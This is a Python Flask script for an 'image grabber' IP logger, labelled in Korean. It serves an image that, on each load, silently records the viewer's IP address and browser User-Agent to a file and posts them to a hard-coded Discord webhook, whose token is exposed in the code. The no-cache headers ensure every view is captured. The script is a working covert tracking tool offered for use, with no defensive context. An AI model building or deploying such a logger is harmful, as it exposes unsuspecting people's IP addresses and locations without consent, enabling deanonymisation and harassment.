from flask import Flask, request, send_from_directory, render_template
from datetime import datetime
import os
import requests
import threading

app = Flask(__name__)
LOG_FILE = "logs/grabbed.txt"

WEBHOOK_URL = "https://discord.com/api/webhooks/1446892630742143006/hrJrXFhVtRFXyPOstS6wi4jguM1iR-pT8874cRhJ4D8z_pnxdwOR0zScrjUSceR8s4EJ"

if not os.path.exists("logs"):
    os.makedirs("logs")

def send_to_discord(ip, ua, timestamp):
    embed = {
        "title": "로거!",
        "description": f"```IP: {ip}\nUA: {ua}```",
        "color": 0x00ff00,
        "timestamp": timestamp,
        "footer": {"text": "이미지 그래버"}
    }
    payload = {
        "content": "이미지 그래버",
        "username": "웹훅",
        "embeds": [embed]
    }
    threading.Thread(target=requests.post, args=(WEBHOOK_URL, ), kwargs={"json": payload}).start()

def log_grab(ip, ua, timestamp):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] IP: {ip} | UA: {ua}\n")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/grabber.png')
def grabber():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    
    ua = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()

    log_grab(ip, ua, timestamp)
    
    send_to_discord(ip, ua, timestamp)
    
    return send_from_directory('static', 'grabber.png'), 200, {
        'Content-Type': 'image/png',
        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0'
    }

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
